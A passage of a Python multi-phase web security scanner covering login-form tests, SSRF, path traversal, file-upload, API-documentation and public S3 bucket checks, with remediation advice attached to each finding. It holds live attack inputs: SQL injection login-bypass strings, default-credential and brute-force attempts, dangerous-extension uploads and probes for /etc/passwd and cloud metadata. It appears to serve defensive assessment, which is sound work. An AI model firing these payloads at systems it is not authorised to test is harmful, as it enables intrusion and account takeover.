                        finding = Finding("Username Enumeration Possible", "Login form reveals whether a username exists or not via error message differences.", RiskRating.MEDIUM, "Return generic error messages for both invalid username and password.", "Web")
                        self.report.add_finding(finding)
                except:
                    pass
                
                # 3. SQLi Auth Bypass Test
                auth_bypass_payloads = [
                    ("' OR '1'='1", "' OR '1'='1"),
                    ("admin' --", "password"),
                    ("admin' #", "password"),
                    ("admin' /*", "password"),
                    ("' OR 1=1#", "password")
                ]
                for user_payload, pass_payload in auth_bypass_payloads:
                    try:
                        time.sleep(0.1)
                        data = {'username': user_payload, 'password': pass_payload}
                        resp = self.session.post(form_action, data=data, allow_redirects=False)
                        # If bypass works, server likely redirects (301/302) to a dashboard instead of returning back to login
                        if resp.status_code in [301, 302] and 'login' not in resp.headers.get('Location', '').lower():
                            print(f"{V_CRITICAL} SQLi Auth Bypass successful using: {user_payload}")
                            finding = Finding("SQL Injection Authentication Bypass", f"Successfully bypassed login using payload: {user_payload}", RiskRating.CRITICAL, "Use parameterized queries or prepared statements.", "Web")
                            self.report.add_finding(finding)
                            break
                    except:
                        pass
                
                # 4. Default Credentials Guessing
                default_creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]
                for user, pwd in default_creds:
                    try:
                        time.sleep(0.1)
                        data = {'username': user, 'password': pwd}
                        resp = self.session.post(form_action, data=data, allow_redirects=False)
                        if resp.status_code in [301, 302] and 'login' not in resp.headers.get('Location', '').lower():
                            print(f"{V_CRITICAL} Default Credentials accepted: {user}:{pwd}")
                            finding = Finding("Default Credentials Preserved", f"Login accepted default system credentials: {user}:{pwd}", RiskRating.CRITICAL, "Change default credentials immediately.", "Web")
                            self.report.add_finding(finding)
                            break
                    except:
                        pass
                
                # 5. Lockout Testing (Brute-force protection check)
                try:
                    print(f"{INFO} Testing Rate Limiting / Lockout on Login...")
                    locked_out = False
                    for i in range(12):  # Send 12 rapid failed logins
                        data = {'username': 'testuserlockout', 'password': f'wrongpass{i}'}
                        resp = self.session.post(form_action, data=data)
                        if resp.status_code == 429 or 'captcha' in resp.text.lower() or 'locked' in resp.text.lower() or 'too many' in resp.text.lower():
                            locked_out = True
                            print(f"{SUCCESS} Brute-force protection / rate-limiting detected on login!")
                            break
                    
                    if not locked_out:
                        print(f"{V_HIGH} Missing Brute-Force/Lockout protection on Login")
                        finding = Finding("Missing Login Brute-Force Protection", "Application allowed 12 rapid consecutive failed authentication attempts without blocking or throttling.", RiskRating.HIGH, "Implement account lockout mechanisms, IP rate-limiting, or CAPTCHA.", "Web")
                        self.report.add_finding(finding)
                except:
                    pass
                    
                break  # Only perform these rigorous tests on the first detected login form
    
    def check_integrity_failures(self):
        """Check for integrity failures"""
        print(f"\n{INFO} Checking for Integrity Failures")
        
        try:
            response = self.session.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for scripts without SRI
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src']
                if not script.get('integrity') and not script.get('crossorigin'):
                    if src.startswith('http') and not src.startswith(urlparse(self.target).netloc):
                        print(f"{V_LOW} External script without SRI: {src}")
                        
                        finding = Finding(
                            "Missing Subresource Integrity",
                            f"External script {src} loaded without SRI hash",
                            RiskRating.LOW,
                            "Add integrity and crossorigin attributes to external scripts",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break  # Report once
                        
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} Integrity check failed: {str(e)}")
    
    def check_logging_failures(self):
        """Check for logging and monitoring failures"""
        print(f"\n{INFO} Checking for Logging Failures")
        
        # Test for verbose errors
        error_triggers = [
            "'", '"', '\\', ';', '|', '&', '$', '%', '#', '@',
            '?', '=', '+', '-', '*', '/', '!', '`', '~'
        ]
        
        for trigger in error_triggers:
            try:
                test_url = f"{self.target}{trigger}"
                response = self.session.get(test_url)
                
                # Check for stack traces
                stack_indicators = [
                    'stack trace', 'at ', 'line ', 'exception',
                    'error', 'warning', 'fatal', 'uncaught',
                    'on line', 'in /var/www', 'in C:\\'
                ]
                
                if response.status_code >= 500:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in stack_indicators):
                        print(f"{V_MEDIUM} Verbose error page detected")
                        
                        finding = Finding(
                            "Verbose Error Messages",
                            "Application reveals stack traces or internal paths in error pages",
                            RiskRating.MEDIUM,
                            "Implement custom error pages and disable detailed error messages in production",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
                        
            except:
                pass
    
    def check_ssrf(self):
        """Check for Server-Side Request Forgery"""
        print(f"\n{INFO} Checking for SSRF")
        
        # Get baseline response to prevent false positives
        try:
            baseline_text = self.session.get(self.target, timeout=5).text.lower()
        except:
            baseline_text = ""
            
        # Find parameters that might be URLs
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'return', 
                      'next', 'src', 'source', 'load', 'file', 'document']
        
        # Refined specific indicators
        ssrf_indicators = [
            'root:x:', 'daemon:x:', 'etc/passwd', 'latest/meta-data',
            'computeMetadata', 'instance-id', 'ami-id', 'elasticsearch'
        ]
        
        for param in url_params:
            for payload in SSRF_PAYLOADS[:3]:  # Test first few payloads
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    response_text = response.text.lower()
                    
                    # Check for signs of SSRF
                    for indicator in ssrf_indicators:
                        if indicator in response_text and indicator not in baseline_text:
                            print(f"{V_CRITICAL} Possible SSRF found in parameter: {param}")
                            print(f"       -> Exact Location: {test_url}")
                            
                            finding = Finding(
                                "Server-Side Request Forgery (SSRF)",
                                f"Parameter '{param}' appears to allow fetching internal resources",
                                RiskRating.CRITICAL,
                                "Implement URL whitelisting, validate and sanitize URL inputs",
                                "Web"
                            )
                            finding.add_evidence(f"Vulnerable URL: {test_url}")
                            finding.add_evidence(f"Indicator matched: {indicator}")
                            self.report.add_finding(finding)
                            break
                            
                except:
                    pass
    
    def additional_checks(self):
        """Perform additional security checks"""
        print(f"\n{INFO} Performing Additional Checks")
        
        # Check for clickjacking
        if 'X-Frame-Options' not in self.headers:
            print(f"{V_MEDIUM} Site may be vulnerable to clickjacking")
            
            finding = Finding(
                "Clickjacking Vulnerability",
                "X-Frame-Options header missing, site can be embedded in iframes",
                RiskRating.MEDIUM,
                "Add X-Frame-Options: DENY or SAMEORIGIN header",
                
                "Web"
            )
            self.report.add_finding(finding)
        
        # Check for file upload vulnerabilities
        for form in self.forms:
            enctype = form.get('enctype', '')
            if 'multipart/form-data' in enctype:
                print(f"{V_LOW} File upload form detected")
                
                # Test dangerous file extensions
                dangerous_extensions = ['.php', '.php5', '.phtml', '.asp', '.aspx', '.jsp', '.exe']
                
                for ext in dangerous_extensions:
                    try:
                        files = {'file': (f'test{ext}', 'test content', 'text/plain')}
                        response = self.session.post(urljoin(self.target, form.get('action', '')), files=files)
                        
                        if response.status_code == 200 and 'uploaded' in response.text.lower():
                            print(f"{V_CRITICAL} File upload may accept dangerous extension: {ext}")
                            
                            finding = Finding(
                                "Insecure File Upload",
                                f"File upload accepts {ext} files which could lead to RCE",
                                RiskRating.CRITICAL,
                                "Validate file types on server-side, store files outside web root",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            break
                            
                    except:
                        pass
                
                break
        
        # Check for path traversal
        parameters = set()
        
        # Extract parameters from forms
        for form in self.forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.add(name)
        
        # Extract parameters from URL
        parsed = urlparse(self.target)
        if parsed.query:
            for param in parse_qs(parsed.query):
                parameters.add(param)

        for param in parameters:
            for payload in PATH_TRAVERSAL:
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    traversal_indicators = ['root:x:', 'daemon:x:', 'bin:x:', '[extensions]']
                    if any(indicator in response.text for indicator in traversal_indicators):
                        print(f"{V_CRITICAL} Path traversal in parameter: {param}")
                        
                        finding = Finding(
                            "Path Traversal Vulnerability",
                            f"Parameter '{param}' allows directory traversal",
                            RiskRating.CRITICAL,
                            "Validate file paths, use whitelist of allowed files",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass

# ==================== PHASE 4: API ====================
class APIScanner:
    """Phase 4: API Security Scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = target if target.startswith(('http://', 'https://')) else f"http://{target}"
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        import random
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
        ]
        self.session.headers.update({"User-Agent": random.choice(user_agents)})
        
    def run(self):
        print(f"\n{INFO} Starting Phase 4: API Security Scan on {self.target}")
        self.check_api_endpoints()
        self.check_api_docs()
        print(f"{SUCCESS} Phase 4 completed")
        
    def check_api_endpoints(self):
        print(f"\n{INFO} Checking for exposed API endpoints")
        api_paths = ['/api/', '/api/v1/', '/api/v2/', '/api/v3/', '/graphql', '/graphql/', '/v1/', '/v2/']
        for path in api_paths:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 401, 403] and 'application/json' in response.headers.get('Content-Type', ''):
                    print(f"{V_MEDIUM} API Endpoint Discovered: {path} (Status: {response.status_code})")
                    finding = Finding("API Endpoint Exposed", f"Exposed API endpoint at {path}", RiskRating.MEDIUM, "Ensure proper authentication and authorization (e.g., BOLA protections) on all API endpoints", "API")
                    self.report.add_finding(finding)
            except:
                pass
                
    def check_api_docs(self):
        print(f"\n{INFO} Checking for exposed API Documentation (Swagger/OpenAPI)")
        doc_paths = ['/swagger.json', '/openapi.json', '/api-docs', '/swagger-ui.html', '/v3/api-docs', '/api/swagger.json']
        for path in doc_paths:
            try:
                time.sleep(0.1)
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5)
                if response.status_code == 200 and ('swagger' in response.text.lower() or 'openapi' in response.text.lower()):
                    print(f"{V_HIGH} API Documentation Exposed: {path}")
                    finding = Finding("API Documentation Exposed", f"Swagger/OpenAPI documentation publicly accessible at {path}", RiskRating.HIGH, "Restrict access to API documentation to internal IP addresses or authenticated developers.", "API")
                    self.report.add_finding(finding)
            except:
                pass

# ==================== PHASE 5: CLOUD ====================
class CloudScanner:
    """Phase 5: Cloud Infrastructure & Bucket Hunting"""
    
    def __init__(self, target, report, verbose=False):
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f"http://{target}")
        self.domain = parsed.netloc or parsed.path
        self.domain = self.domain.replace('www.', '')
        self.report = report
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        
    def run(self):
        print(f"\n{INFO} Starting Phase 5: Cloud Infrastructure Scan for {self.domain}")
        self.check_s3_buckets()
        print(f"{SUCCESS} Phase 5 completed")
        
    def check_s3_buckets(self):
        print(f"\n{INFO} Hunting for unprotected AWS S3 Buckets")
        base_name = self.domain.split('.')[0]
        environments = ['', '-dev', '-test', '-prod', '-staging', '-backup', '-assets', '-public', '-media']
        
        for env in environments:
            bucket_name = f"{base_name}{env}"
            bucket_url = f"http://{bucket_name}.s3.amazonaws.com"
            try:
                time.sleep(0.1)
                response = self.session.get(bucket_url, timeout=5)
                if response.status_code == 200 and 'ListBucketResult' in response.text:
                    print(f"{V_CRITICAL} Public S3 Bucket Discovered (Listable): {bucket_url}")
                    finding = Finding("Public S3 Bucket", f"S3 Bucket '{bucket_name}' allows public directory listing.", RiskRating.CRITICAL, "Configure S3 bucket ACL to block public access.", "Cloud")
                    self.report.add_finding(finding)
                elif response.status_code == 403 and 'AccessDenied' in response.text:
                    if self.verbose:
                        print(f"{INFO} S3 Bucket exists but is private: {bucket_url}")
            except:
                pass

# ==================== MAIN APPLICATION ====================
class SecurityAssessmentTool:
    """Main application class"""
    
    def __init__(self):
        self.args = None
        self.report = None
        self.start_time = time.time()
        
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(
            description='Advanced Security Assessment Tool - Multi-phase automated security scanner',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
Examples:
  %(prog)s -t example.com --all
  %(prog)s -t 192.168.1.1 --phase 1 -o report.txt
  %(prog)s -t example.com --phase 2 --phase 3 -v
            '''
        )
        
        parser.add_argument('-t', '--target', required=True,
                          help='Target domain or IP address')
        
        parser.add_argument('--phase', type=int, choices=[1, 2, 3, 4, 5], action='append',
                          help='Scan phase to run (1=Network, 2=Subdomain, 3=Web, 4=API, 5=Cloud). Can be specified multiple times.')
        
        parser.add_argument('--all', action='store_true',
                          help='Run all scan phases')
        
        parser.add_argument('-o', '--output',
                          help='Output file for report (if not specified, generates timestamped file)')
        
        parser.add_argument('--format', choices=['txt', 'json'], default='txt',
                          help='Report format (default: txt)')
        
        parser.add_argument('-v', '--verbose', action='store_true',
                          help='Enable verbose output')
        
        parser.add_argument('--no-banner', action='store_true',
                          help='Suppress banner display')
        
        self.args = parser.parse_args()
        
        # Validate arguments
        if not self.args.phase and not self.args.all:
            parser.error("Either --phase or --all must be specified")
    
    def setup(self):
        """Setup the scanning environment"""
        if not self.args.no_banner:
            print(BANNER)
        
        # Create report
        self.report = Report(self.args.target)
        
        print(f"{INFO} Target: {self.args.target}")
        print(f"{INFO} Start Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{INFO} Verbose Mode: {'ON' if self.args.verbose else 'OFF'}")
        print("-" * 60)
    
    def run_phase1(self):
        """Run network scan phase"""
        scanner = NetworkScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def run_phase2(self):
        """Run subdomain scan phase"""
        scanner = SubdomainScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def run_phase3(self):
        """Run web application scan phase"""
        scanner = WebScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
        
    def run_phase4(self):
        """Run API security scan phase"""
        scanner = APIScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
        
    def run_phase5(self):
        """Run Cloud infrastructure scan phase"""
        scanner = CloudScanner(self.args.target, self.report, self.args.verbose)
        scanner.run()
    
    def generate_report(self):
        """Generate and save the final report"""
        print(f"\n{INFO} Generating Final Report...")
        
        # Determine output filename
        if self.args.output:
            filename = self.args.output
        else:
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_target = re.sub(r'[^\w\.-]', '_', self.args.target)[:50]
            filename = f"asat_report_{safe_target}_{timestamp}.{self.args.format}"
        
        # Generate report content
        if self.args.format == 'json':
            report_content = self.report.generate_json_report()
        else:
            report_content = self.report.generate_text_report()
        
        # Save to file
        try:
            with open(filename, 'w') as f:
                f.write(report_content)
            print(f"{SUCCESS} Report saved to: {filename}")
        except Exception as e:
            print(f"{CRITICAL} Failed to save report: {str(e)}")
        
        # Print summary
        print(f"\n{SUCCESS} Scan completed in {time.time() - self.start_time:.2f} seconds")
        print(f"{INFO} Findings Summary:")
        for risk in [RiskRating.CRITICAL, RiskRating.HIGH, RiskRating.MEDIUM, RiskRating.LOW, RiskRating.INFO]:
            count = self.report.scan_summary.get(risk, 0)
            marker = RiskRating.marker(risk)
            print(f"  {marker} {risk}: {count}")
    
    def run(self):
        """Main execution method"""
        try:
            self.parse_arguments()
            self.setup()
            
            # Determine which phases to run
            phases_to_run = []
            if self.args.all:
                phases_to_run = [1, 2, 3, 4, 5]
            else:
                phases_to_run = self.args.phase
            
            # Run selected phases
            for phase in phases_to_run:
                if phase == 1:
                    self.run_phase1()
                elif phase == 2:
                    self.run_phase2()
                elif phase == 3:
                    self.run_phase3()
                elif phase == 4:
                    self.run_phase4()
                elif phase == 5:
                    self.run_phase5()
                
                # Add separator between phases
                if len(phases_to_run) > 1 and phase != phases_to_run[-1]:
                    print("\n" + "=" * 60 + "\n")
            
            # Generate final report
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n{WARNING} Scan interrupted by user")
            sys.exit(0)
        except Exception as e:
            print(f"\n{CRITICAL} Unexpected error: {str(e)}")
            if self.args.verbose:
                import traceback
                traceback.print_exc()
            sys.exit(1)

# ==================== ENTRY POINT ====================
def main():
    """Main entry point"""
    tool = SecurityAssessmentTool()
    tool.run()

if __name__ == "__main__":
    main()